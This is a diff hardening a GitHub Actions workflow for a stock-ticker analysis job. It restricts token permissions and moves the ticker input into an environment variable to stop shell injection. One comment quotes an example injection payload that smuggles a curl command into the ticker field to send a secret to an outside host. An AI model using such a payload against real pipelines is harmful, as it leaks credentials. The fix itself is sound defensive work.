@@ -16,6 +16,12 @@ name: Analyze Single Ticker
 # `concurrency` (per-ticker group). Dispatches for different tickers
 # run in parallel up to the runner pool size.
 
+# Lock down GITHUB_TOKEN — defaults to repo read-write; these
+# workflows only need read for checkout (no commits/PRs/issues from
+# them). Defense in depth in case any third-party action gets pwned.
+permissions:
+  contents: read
+
 on:
   workflow_dispatch:
     inputs:
@@ -47,15 +53,20 @@ jobs:
           pip install supabase "psycopg[binary]"
 
       - name: Ingest bars (weekly + monthly) for this ticker
+        # 2026-05-28 — TICKER passed via env (not direct ${{}} into shell)
+        # to block command injection. Direct interpolation lets anyone
+        # with workflow_dispatch rights leak the entire env block via a
+        # crafted ticker payload (`aapl"; curl https://x/$SECRET #`).
         env:
           SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
           SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
           SUPABASE_DB_PASSWORD: ${{ secrets.SUPABASE_DB_PASSWORD }}
+          TICKER: ${{ inputs.ticker }}
         run: |
           # One-shot bar ingest so the chart endpoint (/api/chart) AND
           # the analyzer both see the bars. KR uses FDR daily → resample
           # W+M, US uses Naver weekCandle + monthCandle directly.
-          python -m app.db.ingest_bars --tickers "${{ inputs.ticker }}"
+          python -m app.db.ingest_bars --tickers "$TICKER"
 
       - name: Scan one ticker
         env:
@@ -63,11 +74,12 @@ jobs:
           SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
           SUPABASE_DB_PASSWORD: ${{ secrets.SUPABASE_DB_PASSWORD }}
           FRED_API_KEY: ${{ secrets.FRED_API_KEY }}
+          TICKER: ${{ inputs.ticker }}
         run: |
           # scan_daily reads bars(granularity='W') and writes
           # analyze_results + scan_results. The previous step seeded
           # bars; this step computes the 17-pattern analysis.
-          python -m app.db.scan_daily --tickers "${{ inputs.ticker }}" --years 2
+          python -m app.db.scan_daily --tickers "$TICKER" --years 2
 
       - name: Send any new alerts
         env:
